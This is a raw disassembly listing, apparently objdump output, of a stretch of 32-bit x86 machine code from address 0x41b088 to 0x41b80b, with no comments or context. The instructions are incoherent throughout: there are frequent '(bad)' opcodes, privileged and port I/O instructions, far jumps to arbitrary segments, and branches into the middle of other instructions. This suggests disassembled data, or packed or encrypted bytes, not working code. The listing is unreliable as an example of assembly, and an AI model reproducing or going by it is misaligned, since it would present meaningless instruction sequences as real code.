  41b088:	mov    ds:0x2de237eb,al
  41b08d:	imul   edi,DWORD PTR ds:0x59e04567,0x1f
  41b094:	or     esp,DWORD PTR [ebp+ecx*1-0x199afb45]
  41b09b:	push   0xcbd3d8e0
  41b0a0:	pop    ecx
  41b0a1:	iret   
  41b0a2:	push   esp
  41b0a3:	push   eax
  41b0a4:	lods   eax,DWORD PTR ds:[esi]
  41b0a5:	and    cl,BYTE PTR [edx]
  41b0a7:	sbb    BYTE PTR [ebp+ebx*4+0x43],dl
  41b0ab:	int    0xb8
  41b0ad:	mov    eax,0x250f8458
  41b0b2:	mov    ds:0x37a11255,al
  41b0b7:	sub    DWORD PTR [ebx+ebp*1],0x2167e541
  41b0be:	fidivr WORD PTR [ecx-0x4718b268]
  41b0c4:	dec    esp
  41b0c5:	add    al,0x7c
  41b0c7:	rcr    BYTE PTR [edx-0x3e170b5b],0xd6
  41b0ce:	das    
  41b0cf:	call   DWORD PTR [edx-0x5d]
  41b0d2:	adc    edx,0x78
  41b0d5:	ud2    
  41b0d7:	or     eax,0xba098275
  41b0dc:	pop    edx
  41b0dd:	lahf   
  41b0de:	punpckhwd mm1,QWORD PTR [edi]
  41b0e1:	mov    eax,ds:0xd36bda36
  41b0e6:	lods   al,BYTE PTR ds:[esi]
  41b0e7:	push   0xfffffffe
  41b0e9:	sub    al,0x54
  41b0eb:	adc    al,0x51
  41b0ed:	pusha  
  41b0ee:	in     al,0x84
  41b0f0:	mov    esp,0x1f18b9f1
  41b0f5:	adc    DWORD PTR [edx+0xb1e3b52],ecx
  41b0fb:	ja     0x41b0f2
  41b0fd:	sub    al,0x55
  41b0ff:	lahf   
  41b100:	lods   eax,DWORD PTR ds:[esi]
  41b101:	pop    esi
  41b102:	xlat   BYTE PTR ds:[ebx]
  41b103:	sti    
  41b104:	fmul   QWORD PTR [ebx+ebx*4+0x6b]
  41b108:	clc    
  41b109:	(bad)  
  41b10a:	mov    edx,0xe31f4ff8
  41b10f:	mov    dh,BYTE PTR [edx+0x47]
  41b112:	xor    BYTE PTR [ebp+0x26],dh
  41b115:	test   DWORD PTR [esi-0x14],edx
  41b118:	sub    bh,bh
  41b11a:	cmc    
  41b11b:	fstp   TBYTE PTR [eax+0x6e]
  41b11e:	outs   dx,DWORD PTR ds:[esi]
  41b11f:	pop    ds
  41b120:	in     al,dx
  41b121:	jge    0x41b0ec
  41b123:	xchg   BYTE PTR [ebp+0x75],cl
  41b126:	and    eax,0x8cb5486c
  41b12b:	mov    edi,0x42ba0567
  41b130:	pop    esi
  41b131:	out    0xc3,al
  41b133:	pop    esi
  41b134:	cmp    eax,DWORD PTR [eax]
  41b136:	rol    DWORD PTR [edi],1
  41b138:	dec    ecx
  41b139:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b13a:	shr    bl,cl
  41b13c:	(bad)  
  41b13d:	push   ebp
  41b13e:	or     eax,0x54f9f3e8
  41b143:	jmp    0xc5318e44
  41b148:	arpl   si,si
  41b14a:	es dec ecx
  41b14c:	push   es
  41b14d:	(bad)  
  41b14e:	mov    eax,0x56c70ac4
  41b153:	ror    DWORD PTR [ebp-0x2238156e],1
  41b159:	scas   al,BYTE PTR es:[edi]
  41b15a:	aad    0xc6
  41b15c:	jmp    0x117c:0x57eb93b1
  41b163:	xchg   edx,ebx
  41b165:	(bad)  
  41b166:	and    eax,edi
  41b168:	jp     0x41b1a6
  41b16a:	jmp    FWORD PTR fs:[edx-0x70]
  41b16e:	dec    edi
  41b16f:	jo     0x41b170
  41b171:	sti    
  41b172:	jmp    0x41b142
  41b174:	repz fild DWORD PTR [esi-0x7b]
  41b178:	sti    
  41b179:	iret   
  41b17a:	out    0x92,al
  41b17c:	cmp    DWORD PTR [ebx+0x23c2c71b],0xffffffb7
  41b183:	sti    
  41b184:	loop   0x41b119
  41b186:	sbb    DWORD PTR [edi+ecx*8],edi
  41b189:	sbb    dl,dl
  41b18b:	outs   dx,BYTE PTR ds:[esi]
  41b18c:	dec    esp
  41b18d:	cmc    
  41b18e:	cld    
  41b18f:	sub    al,0xdf
  41b191:	ins    DWORD PTR es:[edi],dx
  41b192:	push   cs
  41b193:	imul   edi,DWORD PTR [ebx+0x53],0xffffffef
  41b197:	aaa    
  41b198:	sbb    cl,cl
  41b19a:	add    DWORD PTR [ebx],ebp
  41b19c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b19d:	fisub  DWORD PTR ds:0x6410e26b
  41b1a3:	and    al,0xec
  41b1a5:	mov    ds:0xbcdbef5,eax
  41b1aa:	loopne 0x41b17e
  41b1ac:	ret    0x7e06
  41b1af:	out    dx,eax
  41b1b0:	xor    esi,ebx
  41b1b2:	dec    edx
  41b1b3:	jno    0x41b16c
  41b1b5:	fucompp 
  41b1b7:	outs   dx,BYTE PTR ds:[esi]
  41b1b8:	push   cs
  41b1b9:	push   ecx
  41b1ba:	loop   0x41b203
  41b1bc:	out    0x7c,al
  41b1be:	cli    
  41b1bf:	shl    BYTE PTR [esi+ecx*1+0x7922d85e],0xac
  41b1c7:	adc    BYTE PTR [esi-0x12],0xc8
  41b1cb:	pop    edx
  41b1cc:	add    al,bh
  41b1ce:	lods   al,BYTE PTR ds:[esi]
  41b1cf:	jne    0x41b218
  41b1d1:	js     0x41b222
  41b1d3:	dec    edi
  41b1d4:	xchg   DWORD PTR [esi-0x7122f348],edi
  41b1da:	mov    eax,0x50a8fcb9
  41b1df:	inc    ebp
  41b1e0:	je     0x41b203
  41b1e2:	mov    ecx,DWORD PTR [edx+0x5fe7dbc]
  41b1e8:	dec    eax
  41b1e9:	retf   0xcd9e
  41b1ec:	mov    cl,0x4a
  41b1ee:	push   edi
  41b1ef:	inc    esp
  41b1f0:	retf   
  41b1f1:	vmread edx,esi
  41b1f4:	or     eax,0xc7f842c7
  41b1f9:	fild   WORD PTR [ebp+0x7011b453]
  41b1ff:	rcr    BYTE PTR [ebx-0x1a830965],cl
  41b205:	pop    es
  41b206:	das    
  41b207:	test   al,0x69
  41b209:	test   DWORD PTR [ebx],ecx
  41b20b:	mov    eax,0xec4b69e2
  41b210:	fs mov esp,ebx
  41b213:	mov    ebp,0x8ab3f7ba
  41b218:	mov    ebp,0x873117e
  41b21d:	bound  eax,QWORD PTR [ebx+0x4f]
  41b220:	sar    DWORD PTR [edi-0x6c008d10],1
  41b226:	xor    BYTE PTR [edx+0x30e7fe07],bl
  41b22c:	fs nop
  41b22e:	ret    
  41b22f:	sbb    BYTE PTR [esi+esi*1+0x456edb34],0xa8
  41b237:	dec    ecx
  41b238:	arpl   WORD PTR [eax],sp
  41b23a:	xor    al,0xaf
  41b23c:	retf   
  41b23d:	fild   QWORD PTR [eax]
  41b23f:	jle    0x41b1e6
  41b241:	data16 (bad) 
  41b243:	inc    eax
  41b244:	mov    al,ds:0x1066debb
  41b249:	(bad)  
  41b24a:	mov    ch,0x92
  41b24c:	mov    bh,0x1d
  41b24e:	aam    0xb0
  41b250:	data16 sub BYTE PTR [ecx-0x39e6923b],bl
  41b257:	pop    ebx
  41b258:	mov    al,0x14
  41b25a:	sar    BYTE PTR [ecx+eax*4+0x1d593b1f],1
  41b261:	push   esi
  41b262:	cmp    esi,DWORD PTR [eax]
  41b264:	mov    esi,DWORD PTR [edi-0x21]
  41b267:	push   cs
  41b268:	pushf  
  41b269:	mov    esi,0xa2e4a2d0
  41b26f:	shr    BYTE PTR [ebx-0x39c3dd43],1
  41b275:	fwait
  41b276:	mov    esp,0x1ebb77fc
  41b27b:	ret    0x92db
  41b27e:	cwde   
  41b27f:	mov    al,0x59
  41b281:	jl     0x41b26e
  41b283:	xor    dh,BYTE PTR [esi+0x5446efa0]
  41b289:	faddp  st(0),st
  41b28b:	mov    bh,0x55
  41b28d:	jno    0x41b240
  41b28f:	leave  
  41b290:	sbb    ebx,ecx
  41b292:	cmp    al,0x48
  41b294:	loopne 0x41b2aa
  41b296:	scas   al,BYTE PTR es:[edi]
  41b297:	jl     0x41b2be
  41b299:	push   ss
  41b29a:	mov    dh,0x45
  41b29c:	xchg   ecx,eax
  41b29d:	mov    ch,0x54
  41b29f:	in     eax,dx
  41b2a0:	(bad)  
  41b2a1:	aaa    
  41b2a2:	test   DWORD PTR [ecx-0x951fa2c],0xa663c36f
  41b2ac:	lods   eax,DWORD PTR ds:[esi]
  41b2ad:	rcl    DWORD PTR [esp+edx*8],cl
  41b2b0:	push   cs
  41b2b1:	xor    dh,dh
  41b2b3:	inc    ebp
  41b2b4:	jb     0x41b312
  41b2b6:	es mov esp,0x24b931a3
  41b2bc:	inc    esp
  41b2bd:	xor    eax,0xa7cd7155
  41b2c2:	push   esi
  41b2c3:	ret    
  41b2c4:	loopne 0x41b28d
  41b2c6:	xchg   edx,eax
  41b2c7:	push   es
  41b2c8:	xchg   DWORD PTR [esi+0x6],edi
  41b2cb:	add    eax,0xa73f251e
  41b2d0:	arpl   WORD PTR [edx-0x153debca],si
  41b2d6:	xchg   esp,eax
  41b2d7:	adc    bh,BYTE PTR [edi-0x72643a92]
  41b2dd:	pop    edi
  41b2de:	test   bh,dl
  41b2e0:	jb     0x41b356
  41b2e2:	dec    ebp
  41b2e3:	jmp    0x3bdf:0x2260dfef
  41b2ea:	stos   DWORD PTR es:[edi],eax
  41b2eb:	bound  ebx,QWORD PTR [esi-0x63]
  41b2ee:	jecxz  0x41b34a
  41b2f0:	jle    0x41b325
  41b2f2:	mov    DWORD PTR [ebx-0x61],esp
  41b2f5:	ret    0xb34a
  41b2f8:	jno    0x41b353
  41b2fa:	inc    ebp
  41b2fb:	das    
  41b2fc:	adc    eax,0xad2f1466
  41b301:	mov    esp,0xffb8c81b
  41b306:	inc    ebp
  41b307:	jmp    0x54a3:0xcb7da11
  41b30e:	test   edi,esp
  41b310:	cs jno 0x41b372
  41b313:	pop    ss
  41b314:	adc    al,0x27
  41b316:	jnp    0x41b299
  41b318:	xchg   ecx,eax
  41b319:	cli    
  41b31a:	std    
  41b31b:	mov    bh,0x1e
  41b31d:	iret   
  41b31e:	push   ds
  41b31f:	pop    es
  41b320:	pop    esp
  41b321:	push   ebx
  41b322:	icebp  
  41b323:	adc    eax,0x29613b40
  41b328:	xor    eax,0xa0b12b76
  41b32d:	jmp    0x41b34c
  41b32f:	jecxz  0x41b2cb
  41b331:	pop    ebx
  41b332:	das    
  41b333:	mov    ds:0x6c4e59e1,eax
  41b338:	in     al,0x87
  41b33a:	jmp    0xc53befee
  41b33f:	cmp    al,0x9d
  41b341:	aaa    
  41b342:	xor    eax,0x864f218a
  41b347:	mov    ecx,DWORD PTR [edx-0x72c5af8]
  41b34d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b34e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b34f:	mov    bl,0x29
  41b351:	stos   DWORD PTR es:[edi],eax
  41b352:	jne    0x41b31e
  41b354:	hlt    
  41b355:	test   al,0xc6
  41b357:	and    eax,DWORD PTR [ebx]
  41b359:	lods   al,BYTE PTR ds:[esi]
  41b35a:	cmp    DWORD PTR [edi-0x7d],0x25011066
  41b361:	fcom   st(7)
  41b363:	xchg   edi,eax
  41b364:	enter  0xf79f,0xa1
  41b368:	or     DWORD PTR [ebp-0x7ade4c95],edx
  41b36e:	dec    esi
  41b36f:	ror    BYTE PTR [esi-0x29d244c9],0xf
  41b376:	ror    dh,0xe8
  41b379:	push   ebp
  41b37a:	out    0xaa,eax
  41b37c:	cmp    edx,DWORD PTR [ebp-0x2f]
  41b37f:	sbb    DWORD PTR [edi+0x6200e0d2],eax
  41b385:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b386:	xchg   ecx,eax
  41b387:	pop    edi
  41b388:	mul    BYTE PTR [esi]
  41b38a:	mov    al,ds:0x8bada4bd
  41b38f:	gs cmp eax,0x864c09e5
  41b395:	push   esp
  41b396:	je     0x41b3c8
  41b398:	dec    eax
  41b399:	adc    eax,esp
  41b39b:	test   al,0xca
  41b39d:	mov    esi,0x894783cf
  41b3a2:	sar    DWORD PTR ds:0x698fb3de,1
  41b3a8:	test   eax,0xef6d89e4
  41b3ad:	jmp    0x41b3cc
  41b3af:	sahf   
  41b3b0:	inc    eax
  41b3b1:	push   es
  41b3b2:	pusha  
  41b3b3:	rol    DWORD PTR [eax+edi*1],cl
  41b3b6:	ror    ch,0x7b
  41b3b9:	sbb    ch,BYTE PTR [eax+0x2ae3accb]
  41b3bf:	sbb    al,0x57
  41b3c1:	test   DWORD PTR [eax+0x37],edx
  41b3c4:	aad    0x57
  41b3c6:	inc    ebx
  41b3c7:	dec    esi
  41b3c8:	lea    ebp,[ebx+0x7c]
  41b3cb:	nop
  41b3cc:	pop    ebp
  41b3cd:	(bad)  
  41b3ce:	mov    ds:0x885a577f,al
  41b3d3:	mov    esi,0xb88f14dc
  41b3d8:	nop
  41b3d9:	cmp    dh,dl
  41b3db:	add    dl,BYTE PTR ds:[edi]
  41b3de:	ds ror bh,0x53
  41b3e2:	inc    ecx
  41b3e3:	push   ds
  41b3e4:	pop    ebp
  41b3e5:	mov    eax,0x447d5d6c
  41b3ea:	adc    al,0x92
  41b3ec:	cmp    bl,BYTE PTR [esi-0x7b]
  41b3ef:	je     0x41b3eb
  41b3f1:	rcl    DWORD PTR [edi-0x2],1
  41b3f4:	push   ebp
  41b3f5:	pop    ebp
  41b3f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3f7:	sbb    ebp,DWORD PTR [edx+0x2a86e56a]
  41b3fd:	jmp    0xe0fe:0xc5a38c2a
  41b404:	dec    edx
  41b405:	imul   ebx,DWORD PTR [edx],0x4d
  41b408:	test   DWORD PTR [edi-0x5f],esi
  41b40b:	adc    al,0x6d
  41b40d:	xchg   BYTE PTR [eax+0x47],ch
  41b410:	add    al,BYTE PTR [ebx-0x370f65f]
  41b416:	daa    
  41b417:	in     eax,0xf4
  41b419:	adc    eax,0xe2477e5
  41b41e:	outs   dx,BYTE PTR ds:[esi]
  41b41f:	dec    eax
  41b420:	retf   
  41b421:	test   eax,0x59c6d6a9
  41b426:	sar    DWORD PTR [eax+edi*2+0x2d],1
  41b42a:	jae    0x41b3d5
  41b42c:	call   0x6d6ee0f2
  41b431:	inc    esp
  41b432:	cmc    
  41b433:	mov    ah,0x2f
  41b435:	pop    esi
  41b436:	adc    dl,cl
  41b438:	fwait
  41b439:	popf   
  41b43a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b43b:	in     eax,dx
  41b43c:	(bad)  
  41b43d:	and    eax,0x9fc49383
  41b442:	push   ss
  41b443:	cld    
  41b444:	add    cl,BYTE PTR [edx]
  41b446:	and    eax,0x5d6783a4
  41b44b:	sbb    DWORD PTR [esi],esi
  41b44d:	icebp  
  41b44e:	jecxz  0x41b3da
  41b450:	cmp    DWORD PTR [eax-0x5a],0x2bf6bc4e
  41b457:	sub    ebx,ebx
  41b459:	in     eax,0x4c
  41b45b:	inc    edx
  41b45c:	fidiv  WORD PTR [esi+edi*1+0x57]
  41b460:	ret    0x1c2e
  41b463:	mov    DWORD PTR [eax],ebx
  41b465:	iret   
  41b466:	fcomp  st(2)
  41b468:	sbb    BYTE PTR [edx+0x554f161d],al
  41b46e:	inc    ebp
  41b46f:	add    eax,0x1780e076
  41b474:	sbb    dl,BYTE PTR [esi+0x72ea509b]
  41b47a:	imul   ecx,DWORD PTR [ebx-0x11],0xd3bc0437
  41b481:	jne    0x41b49b
  41b483:	dec    ecx
  41b484:	fidivr WORD PTR [ebx+0x35c09e87]
  41b48a:	fcom   QWORD PTR [ecx-0x6]
  41b48d:	outs   dx,BYTE PTR ds:[esi]
  41b48e:	mov    ah,0x8c
  41b490:	dec    edx
  41b491:	call   0xacd9:0x58e417bb
  41b498:	xor    esi,ebp
  41b49a:	outs   dx,DWORD PTR ds:[esi]
  41b49b:	lods   eax,DWORD PTR ds:[esi]
  41b49c:	je     0x41b4aa
  41b49e:	dec    esp
  41b49f:	loop   0x41b49f
  41b4a1:	or     edx,esi
  41b4a3:	push   esp
  41b4a4:	fs ret 
  41b4a6:	outs   dx,DWORD PTR ds:[esi]
  41b4a7:	rol    BYTE PTR [edx],0x7e
  41b4aa:	xchg   edx,eax
  41b4ab:	push   edx
  41b4ac:	ja     0x41b4fa
  41b4ae:	aas    
  41b4af:	les    esp,FWORD PTR [ebx+0x4f]
  41b4b2:	pop    ds
  41b4b3:	out    0x6,al
  41b4b5:	das    
  41b4b6:	dec    edx
  41b4b7:	sub    ebx,ebx
  41b4b9:	popa   
  41b4ba:	xchg   ax,ax
  41b4bc:	push   cs
  41b4bd:	aas    
  41b4be:	jmp    0x1014157b
  41b4c3:	push   edx
  41b4c4:	mov    esi,0xcfa7cebd
  41b4c9:	inc    esp
  41b4ca:	push   edi
  41b4cb:	mov    bl,0x6d
  41b4cd:	jp     0x41b4af
  41b4cf:	outs   dx,BYTE PTR ds:[esi]
  41b4d0:	push   ecx
  41b4d1:	sar    bh,0x51
  41b4d4:	hlt    
  41b4d5:	push   es
  41b4d6:	in     al,0x65
  41b4d8:	or     BYTE PTR [ebp+0x50],bl
  41b4db:	mov    ah,0x3a
  41b4dd:	data16 mov al,ds:0xcb56fb6c
  41b4e3:	test   eax,0x3dba7f11
  41b4e8:	test   BYTE PTR [ecx-0x56c59240],dl
  41b4ee:	idiv   esi
  41b4f0:	push   eax
  41b4f1:	add    al,0x44
  41b4f3:	adc    DWORD PTR [ebx+0x6d637793],ebp
  41b4f9:	es jne 0x41b4c1
  41b4fc:	mov    cl,BYTE PTR cs:[eax]
  41b4ff:	mov    cs,WORD PTR ds:0x70668cf6
  41b505:	(bad)  
  41b506:	cmp    BYTE PTR [ecx+0x3f],ch
  41b509:	push   ds
  41b50a:	xor    ebx,DWORD PTR [edi+0x2a]
  41b50d:	inc    eax
  41b50e:	adc    DWORD PTR [ecx+0x174db8ca],edi
  41b514:	sbb    dh,cl
  41b516:	jns    0x41b499
  41b518:	xchg   edx,eax
  41b519:	mov    ebx,0xc6d1c58f
  41b51e:	cwde   
  41b51f:	mov    DWORD PTR [ecx-0x49],ebx
  41b522:	inc    esp
  41b523:	hlt    
  41b524:	jge    0x41b4e6
  41b526:	(bad)  
  41b528:	push   esi
  41b529:	or     eax,0x9c9509ea
  41b52e:	adc    ch,al
  41b530:	std    
  41b531:	xor    esp,DWORD PTR [ecx-0xae37fd0]
  41b537:	cmp    BYTE PTR [eax+0x43],0x2f
  41b53b:	xlat   BYTE PTR ds:[ebx]
  41b53c:	adc    ebp,edx
  41b53e:	fcomi  st,st(5)
  41b540:	pushf  
  41b541:	mov    esi,0x5a4e6a14
  41b546:	sub    edi,DWORD PTR [esi-0x3f91eac2]
  41b54c:	sbb    esi,DWORD PTR [ecx+0x22]
  41b54f:	fidiv  DWORD PTR [edx-0x479479ef]
  41b555:	mov    dh,0xdd
  41b557:	inc    ebp
  41b558:	push   esp
  41b559:	adc    ah,ch
  41b55b:	rcl    bh,cl
  41b55d:	repnz add DWORD PTR [ebp-0xa5b2bd6],edx
  41b564:	xor    DWORD PTR [edx+esi*8-0x4fdd2056],0x43
  41b56c:	dec    ebx
  41b56d:	pop    edx
  41b56e:	in     al,dx
  41b56f:	stos   BYTE PTR es:[edi],al
  41b570:	icebp  
  41b571:	stos   DWORD PTR es:[edi],eax
  41b572:	(bad)  
  41b573:	mov    eax,0x9742db47
  41b578:	std    
  41b579:	mov    al,ds:0x9bc99e25
  41b57e:	sub    bl,BYTE PTR [esi+0x4cb132ff]
  41b584:	add    eax,0x8589e130
  41b589:	(bad)  
  41b58a:	fild   WORD PTR [ecx]
  41b58c:	dec    esp
  41b58d:	lods   al,BYTE PTR ds:[esi]
  41b58e:	sbb    al,0x17
  41b590:	test   DWORD PTR [esi+0x4e],ebx
  41b593:	(bad)  
  41b594:	popf   
  41b595:	pop    ebp
  41b596:	in     al,0xb6
  41b598:	lock jl 0x41b560
  41b59b:	inc    edi
  41b59c:	xor    al,0x33
  41b59e:	pop    edx
  41b59f:	and    eax,0x681d7fb2
  41b5a4:	add    esp,DWORD PTR [edi+0x39]
  41b5a7:	es in  al,0x7c
  41b5aa:	sub    esp,DWORD PTR [edx+0x199ea352]
  41b5b0:	repnz mov ah,0x14
  41b5b3:	dec    ebx
  41b5b4:	cld    
  41b5b5:	test   esi,ebp
  41b5b7:	dec    esi
  41b5b8:	jl     0x41b5c1
  41b5ba:	hlt    
  41b5bb:	shl    esp,1
  41b5bd:	push   0xffffffd6
  41b5bf:	das    
  41b5c0:	test   DWORD PTR [ebx],0x975c944b
  41b5c6:	test   al,0x7e
  41b5c8:	in     al,dx
  41b5c9:	xbegin 0xc80028e9
  41b5cf:	pop    esi
  41b5d0:	push   0xf
  41b5d2:	xlat   BYTE PTR ds:[ebx]
  41b5d3:	mov    ecx,0x2b14ea74
  41b5d8:	outs   dx,DWORD PTR ds:[esi]
  41b5d9:	push   edi
  41b5da:	sub    ebx,DWORD PTR [eax+ebx*1]
  41b5dd:	mov    dl,0x92
  41b5df:	mov    eax,0x90a4c533
  41b5e4:	mov    DWORD PTR [ecx],edx
  41b5e6:	sbb    al,0x96
  41b5e8:	fdiv   QWORD PTR [edi]
  41b5ea:	add    eax,0xf4c0703e
  41b5ef:	gs mov bl,0xf7
  41b5f2:	call   0x4624f47a
  41b5f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5f8:	sub    eax,0xb8afe9c6
  41b5fd:	cmp    bl,ch
  41b5ff:	adc    DWORD PTR [esp+ecx*8+0x4d],esi
  41b603:	inc    edi
  41b604:	xchg   ebp,eax
  41b605:	clc    
  41b606:	push   ecx
  41b607:	adc    al,0x51
  41b609:	jmp    0xdbff203e
  41b60e:	xchg   edx,eax
  41b60f:	push   0xffffffd8
  41b611:	mov    eax,ds:0x40e72fcc
  41b616:	outs   dx,DWORD PTR ds:[esi]
  41b617:	inc    edx
  41b618:	shl    DWORD PTR [ecx-0x1b],1
  41b61b:	or     al,0xc2
  41b61d:	leave  
  41b61e:	xchg   ecx,eax
  41b61f:	push   esi
  41b620:	loope  0x41b61e
  41b622:	nop
  41b623:	retf   0xf28
  41b626:	push   edi
  41b627:	xchg   ebx,eax
  41b628:	into   
  41b629:	mov    dl,0x61
  41b62b:	icebp  
  41b62c:	div    DWORD PTR [edi+esi*4]
  41b62f:	ret    0xc609
  41b632:	jmp    0x97e0503a
  41b637:	shl    bl,cl
  41b639:	pop    ebp
  41b63a:	sbb    BYTE PTR [edi],0x23
  41b63d:	scas   eax,DWORD PTR es:[edi]
  41b63e:	(bad)  
  41b63f:	mov    WORD PTR [edi+0x2fa26a5f],gs
  41b645:	cwde   
  41b646:	ja     0x41b64b
  41b648:	int    0xf2
  41b64a:	dec    ecx
  41b64b:	cs xchg esp,eax
  41b64d:	enter  0x3ab5,0xe8
  41b651:	xchg   edi,eax
  41b652:	mov    cl,0x8d
  41b654:	xchg   ebp,eax
  41b655:	int    0xc8
  41b657:	cmp    eax,0x306194dd
  41b65c:	push   cs
  41b65d:	sar    DWORD PTR [ebx+0x2a8cd939],1
  41b663:	push   ebp
  41b664:	inc    esp
  41b665:	pop    ds
  41b666:	outs   dx,DWORD PTR ds:[esi]
  41b667:	and    esi,DWORD PTR [edi+0x1696ad86]
  41b66d:	iret   
  41b66e:	(bad)  
  41b66f:	outs   dx,BYTE PTR ds:[esi]
  41b670:	ret    0x676f
  41b673:	sbb    edx,DWORD PTR ds:[ecx]
  41b676:	and    ch,BYTE PTR [esi]
  41b678:	pop    esi
  41b679:	mov    cl,0xbc
  41b67b:	mov    ah,0xb1
  41b67d:	aas    
  41b67e:	es retf 0x11c0
  41b682:	mov    al,ds:0x551ff038
  41b687:	and    ch,BYTE PTR [eax+0x43104e39]
  41b68d:	jp     0x41b6cb
  41b68f:	sti    
  41b690:	out    dx,eax
  41b691:	push   edx
  41b692:	jecxz  0x41b6a1
  41b694:	xchg   BYTE PTR [edx-0x6f500c2e],ch
  41b69a:	ds xchg edi,eax
  41b69c:	(bad)  
  41b69d:	xor    BYTE PTR [ecx-0x61],al
  41b6a0:	int    0x15
  41b6a2:	xchg   ebp,eax
  41b6a3:	pop    ss
  41b6a4:	shr    BYTE PTR [ebp-0x39],1
  41b6a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6a8:	hlt    
  41b6a9:	aas    
  41b6aa:	stos   BYTE PTR es:[edi],al
  41b6ab:	aas    
  41b6ac:	push   ss
  41b6ad:	rol    BYTE PTR [ebp+ecx*8+0x335cb42e],0xaa
  41b6b5:	in     al,0xc2
  41b6b7:	add    dh,0xf1
  41b6ba:	and    eax,0x19a8a6ef
  41b6bf:	mov    al,ds:0xb8fc7f0f
  41b6c4:	xor    DWORD PTR [esi-0x5a],0xffffff9d
  41b6c8:	sub    al,0xf4
  41b6ca:	iret   
  41b6cb:	iret   
  41b6cc:	outs   dx,BYTE PTR ds:[esi]
  41b6cd:	push   0x80b19f6d
  41b6d2:	and    eax,DWORD PTR [eax+ecx*1-0x2171766a]
  41b6d9:	enter  0xd94e,0x37
  41b6dd:	or     al,0x36
  41b6df:	dec    ebp
  41b6e0:	jmp    0x41b70a
  41b6e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6e4:	addr16 mov al,0xc8
  41b6e7:	pop    ebx
  41b6e8:	push   0x3c
  41b6ea:	jl     0x41b6ed
  41b6ec:	nop
  41b6ed:	add    ecx,esi
  41b6ef:	ds mov cl,0x71
  41b6f2:	stos   BYTE PTR es:[edi],al
  41b6f3:	push   ebp
  41b6f4:	lea    ebx,[ebx-0x480a12e4]
  41b6fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6fb:	cdq    
  41b6fc:	inc    esi
  41b6fd:	dec    edi
  41b6fe:	and    BYTE PTR [edx-0x61],dh
  41b701:	lea    edi,[ecx-0x42ea27ce]
  41b707:	mov    ss,WORD PTR [ebp+0x7d]
  41b70a:	fisttp DWORD PTR [eax+0x54f53855]
  41b710:	cmp    eax,0xb463fb44
  41b715:	test   ebp,edx
  41b717:	cs ret 0xee7c
  41b71b:	mov    esi,0x8168c353
  41b720:	push   0x142fd4e4
  41b725:	fwait
  41b726:	lods   al,BYTE PTR ds:[esi]
  41b727:	pushf  
  41b728:	dec    edx
  41b729:	inc    esp
  41b72a:	ds push ebx
  41b72c:	jmp    0x2f33:0x584b5189
  41b733:	adc    ebx,0xffffffa3
  41b736:	lock cmc 
  41b738:	mov    WORD PTR [ecx+eax*1+0x54],gs
  41b73c:	scas   al,BYTE PTR es:[edi]
  41b73d:	jae    0x41b7a9
  41b73f:	jo     0x41b78c
  41b741:	out    dx,eax
  41b742:	jge    0x41b78c
  41b744:	in     al,dx
  41b745:	outs   dx,BYTE PTR ds:[esi]
  41b746:	icebp  
  41b747:	clc    
  41b748:	jmp    0x4739ab6d
  41b74d:	adc    BYTE PTR [edi-0x48c011c1],dl
  41b753:	fld    TBYTE PTR ds:0xa22a31de
  41b759:	cmp    eax,0xee5c17ef
  41b75e:	pusha  
  41b75f:	int    0xe4
  41b761:	sbb    bh,ah
  41b763:	dec    esi
  41b764:	cmp    dl,BYTE PTR [eax-0x3b9f7e9c]
  41b76a:	aam    0x83
  41b76c:	mov    al,ds:0x2973b2d8
  41b771:	scas   al,BYTE PTR es:[edi]
  41b772:	push   cs
  41b773:	cdq    
  41b774:	mov    edi,eax
  41b776:	fs sbb edi,edx
  41b779:	aam    0x66
  41b77b:	add    eax,0x4db59a2f
  41b780:	or     ebp,esp
  41b782:	(bad)  
  41b783:	syscall 
  41b785:	xor    esi,DWORD PTR [esi]
  41b787:	(bad)  
  41b788:	scas   eax,DWORD PTR es:[edi]
  41b789:	das    
  41b78a:	dec    edi
  41b78b:	ja     0x41b7f6
  41b78d:	inc    esi
  41b78e:	mov    ebx,0xf56f2482
  41b793:	dec    ebx
  41b794:	add    ebx,DWORD PTR [edx+0x35b96309]
  41b79a:	adc    eax,0x954ab870
  41b79f:	sar    al,1
  41b7a1:	lods   al,BYTE PTR ds:[esi]
  41b7a2:	leave  
  41b7a3:	add    ebp,esp
  41b7a5:	xor    ch,BYTE PTR [edx+eax*8]
  41b7a8:	es sar BYTE PTR cs:[ebp-0x4956421b],1
  41b7b0:	aas    
  41b7b1:	mov    cl,dh
  41b7b3:	fwait
  41b7b4:	xchg   ecx,eax
  41b7b5:	add    eax,ecx
  41b7b7:	ror    BYTE PTR ds:0x71840448,cl
  41b7bd:	push   edx
  41b7be:	cli    
  41b7bf:	xchg   ecx,eax
  41b7c0:	mov    esp,0x1f686d2d
  41b7c5:	mov    dl,0x15
  41b7c7:	xor    bl,BYTE PTR [edx+0x6d]
  41b7ca:	pop    esp
  41b7cb:	fisub  DWORD PTR [ebx*4-0x3a3da418]
  41b7d2:	fucomip st,st(7)
  41b7d4:	adc    eax,0x94175035
  41b7d9:	pop    edi
  41b7da:	or     dl,BYTE PTR [eax-0x36]
  41b7dd:	repnz out 0x8e,al
  41b7e0:	dec    eax
  41b7e1:	out    0x26,al
  41b7e3:	jae    0x41b835
  41b7e5:	lock add BYTE PTR ds:0x632a54a0,ch
  41b7ec:	cmp    eax,0x6c6d9f42
  41b7f1:	pop    esp
  41b7f2:	jge    0x41b818
  41b7f4:	or     al,0x15
  41b7f6:	call   0x86ca:0x5cba7225
  41b7fd:	sub    ebp,DWORD PTR [ebp+0x67]
  41b800:	mov    ds:0x14f7234a,eax
  41b805:	inc    edx
  41b806:	jns    0x41b81b
  41b808:	mov    dl,0xe8
  41b80a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b80b:	je     0x41b85e
